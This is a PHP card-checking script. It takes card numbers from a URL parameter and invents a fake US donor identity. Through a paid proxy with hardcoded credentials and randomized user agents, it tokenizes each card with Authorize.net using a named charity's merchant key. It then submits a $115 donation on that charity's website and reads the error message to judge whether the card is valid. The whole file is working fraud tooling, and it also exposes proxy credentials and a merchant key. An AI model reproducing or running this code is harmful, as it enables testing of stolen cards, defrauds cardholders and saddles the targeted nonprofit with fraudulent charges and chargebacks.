<?php

ob_start();

error_reporting(1);
date_default_timezone_set('America/Buenos_Aires');


if (file_exists(getcwd().'/cookie.txt')) {
    @unlink('cookie.txt');
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  return explode($end, $str[1])[0];
}

function Gen_Randi_U_A()
{
  $platforms = ['Windows NT', 'Macintosh', 'Linux', 'Android', 'iOS'];
  $browsers = ['Mozilla', 'Chrome', 'Opera', 'Safari', 'Edge', 'Firefox'];
  $platform = $platforms[array_rand($platforms)];
  $version = rand(11, 99) . '.' . rand(11, 99);
  $browser = $browsers[array_rand($browsers)];
  $chromeVersion = rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999);
  return "$browser/5.0 ($platform " . rand(11, 99) . ".0; Win64; x64) AppleWebKit/$version (KHTML, like Gecko) $browser/$version.$chromeVersion Safari/$version." . rand(11, 99);
}

$lista = $_GET['lista'];
preg_match_all("/([\d]+\d)/", $lista, $list);
$cc = $list[0][0];
$mes = $list[0][1];
$ano = $list[0][2];
$cvv = $list[0][3];

if (empty($lista)) {
echo '[-] Status: #Error ⚠️ | INVALID FORMAT | Card Not Found | '.$Gate.' | '.$credits.'
<br><br>';
return;
}

# Random USA Person Details - #API

$names = ['Ashish', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'Matthew', 'Ava', 'William'];
$last_names = ['Mishra', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Martinez'];
$company_Names = ['BinBhaiFamily', 'TechSolutions', 'InnovateHub', 'EpicTech', 'CodeMasters', 'WebWizards', 'DataGenius', 'SmartTech', 'QuantumSystems', 'DigitalCrafters'];
$streets = ['Main St', 'Oak St', 'Maple Ave', 'Pine St', 'Cedar Ln', 'Elm St', 'Springfield Dr', 'Highland Ave', 'Meadow Ln', 'Sunset Blvd'];
$cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose'];
$phones = ['682', '346', '246'];
$state_data = [
    'NY' => 'New York',
    'CA' => 'California',
    'TX' => 'Texas',
    'FL' => 'Florida',
    'PA' => 'Pennsylvania',
    'IL' => 'Illinois',
    'OH' => 'Ohio',
    'GA' => 'Georgia',
    'NC' => 'North Carolina',
    'MI' => 'Michigan'
];
$zips = [
    'NY' => '10001',
    'CA' => '90001',
    'TX' => '75001',
    'FL' => '33101',
    'PA' => '19101',
    'IL' => '60601',
    'OH' => '44101',
    'GA' => '30301',
    'NC' => '28201',
    'MI' => '48201'
];

$name = ucfirst($names[array_rand($names)]);
$last = ucfirst($last_names[array_rand($last_names)]);
$com = ucfirst($company_Names[array_rand($company_Names)]);
$street = rand(100, 9999) . ' ' . $streets[array_rand($streets)];
$city = $cities[array_rand($cities)];
$state_code = array_rand($state_data);
$state = $state_data[$state_code];
$zip = $zips[$state_code];
$phone = $phones[array_rand($phones)].'-'.rand(100, 999).'-'.rand(1000, 9999);
$email_domain = ['outlook.com', 'yahoo.ca', 'gmail.com', 'rogers.com', 'hotmail.com'];
$mail = strtolower($name).'.'.strtolower($last).rand(00, 99).'@'.$email_domain[array_rand($email_domain)];

# Retry - Limits

$retry = 0;
start:

# 1st Request - Buy Now

$proxy = 'brd.superproxy.io';
$proxyPort = 33335;
$proxyAuth = 'brd-customer-hl_645cb698-zone-data_center:eza0glb182ga';



$proxy = 'brd.superproxy.io';
$proxyPort = 33335;
$proxyAuth = 'brd-customer-hl_645cb698-zone-data_center:eza0glb182ga';


$ch = curl_init();
// Set cURL options
curl_setopt_array($ch, [
    CURLOPT_URL => 'https://api.ipify.org?format=json',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_PROXY => $proxy,
    CURLOPT_PROXYPORT => $proxyPort,
    CURLOPT_PROXYUSERPWD => $proxyAuth,
    CURLOPT_SSL_VERIFYPEER => false, 
]);
$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'cURL Error: ' . curl_error($ch);
} else {
    echo "Proxy IP Response: $response";
}

curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bishopandersonhouse.org/donate/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'User-Agent: ' . Gen_Randi_U_A(),
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
$r1 = curl_exec($ch);
curl_close($ch);


$json_data = [
    'securePaymentContainerRequest' => [
        'merchantAuthentication' => [
            'name' => '42n4Fdg8Wj',
            'clientKey' => '9zVJSaJK2ws3Hzx5fNFbReP3Qhu5Df2f3RXFTKn5V3B7Q5FKx6yQLn88K3Sd99t9',
        ],
        'data' => [
            'type' => 'TOKEN',
            'id' => uniqid(),
            'token' => [
                'cardNumber' => $cc,
                'expirationDate' => $mes . substr($ano, 2),
                'cardCode' => str_pad(rand(0, 999), 3, '0', STR_PAD_LEFT),
            ],
        ],
    ],
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api2.authorize.net/xml/v1/request.api');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Content-Type: application/json; charset=UTF-8',
    'Origin: https://www.bishopandersonhouse.org',
    'Referer: https://www.bishopandersonhouse.org/donate/',
    'User-Agent: ' . Gen_Randi_U_A(),
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json_data));
$r2 = curl_exec($ch);
curl_close($ch);

$dataValue = GetStr($r2,'"dataValue":"','"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.bishopandersonhouse.org/donate/?payment-mode=authorize&form-id=4426');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: www.bishopandersonhouse.org',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.bishopandersonhouse.org',
    'referer: https://www.bishopandersonhouse.org/donate/',
    'User-Agent: ' . Gen_Randi_U_A(),
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYPORT, $proxyPort);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'give-honeypot=&give-form-id-prefix=4426-1&give-form-id=4426&give-form-title=Donate&give-current-url=https%3A%2F%2Fwww.bishopandersonhouse.org%2Fdonate%2F&give-form-url=https%3A%2F%2Fwww.bishopandersonhouse.org%2Fdonate%2F&give-form-minimum=10&give-form-maximum=1000000&give-form-hash=155867b855&give-price-id=custom&give-recurring-logged-in-only=&give-logged-in-only=1&_give_is_donation_recurring=0&give_recurring_donation_details=%7B%22give_recurring_option%22%3A%22yes_donor%22%7D&give-amount=115&give-recurring-period-donors-choice=month&payment-mode=authorize&give_first='.$name.'&give_last='.$last.'&give_company_option=yes&give_company_name=&give_email='.$mail.'&give_comment=&give-form-user-register-hash=03ccf34de1&give-purchase-var=needs-to-register&card_number=0000000000000000&card_cvc=000&card_name=0000000000000000&card_exp_month=00&card_exp_year=00&card_expiry=00+%2F+00&billing_country=US&card_address=New+york+&card_address_2=&card_city=New+york+&card_state=NY&card_zip=10080&give_authorize_data_descriptor=COMMON.ACCEPT.INAPP.PAYMENT&give_authorize_data_value='.$dataValue.'&give_action=purchase&give-gateway=authorize&38bDI=&zerospam_david_walsh_key=9tU2T');
$r3 = curl_exec($ch);
curl_close($ch);

$err = GetStr($r3, '<p><strong>Error</strong>: ', '</p>');

if (!empty($err)) {
    echo $err;
} else {
    echo 'Err or Handle missing';
}
ob_flush();
unlink('cookie.txt');


?>